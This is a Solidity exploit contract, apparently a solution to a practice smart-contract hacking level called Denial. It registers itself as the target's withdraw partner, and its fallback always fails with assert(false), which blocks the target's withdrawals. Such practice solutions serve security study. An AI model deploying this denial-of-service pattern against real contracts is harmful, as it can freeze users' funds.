// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract DenialAttacker {
    IDenial public instance;

    constructor(address _instance) public {
        instance = IDenial(_instance);
    }

    function attack() public {
        instance.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        assert(false);
    }
}
